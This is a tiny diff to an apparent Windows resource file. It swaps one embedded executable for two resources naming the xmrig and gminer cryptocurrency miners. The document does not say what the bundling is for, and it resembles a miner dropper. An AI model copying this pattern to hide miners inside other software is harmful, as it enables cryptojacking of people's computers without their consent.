@@ -1,2 +1,3 @@
 #include "../include/resources.h"
-EMBEDDED_EXE RCDATA "embedded.exe"
+EMBEDDED_XMRIG RCDATA "xmrig.exe"
+EMBEDDED_GMINER RCDATA "gminer.exe"
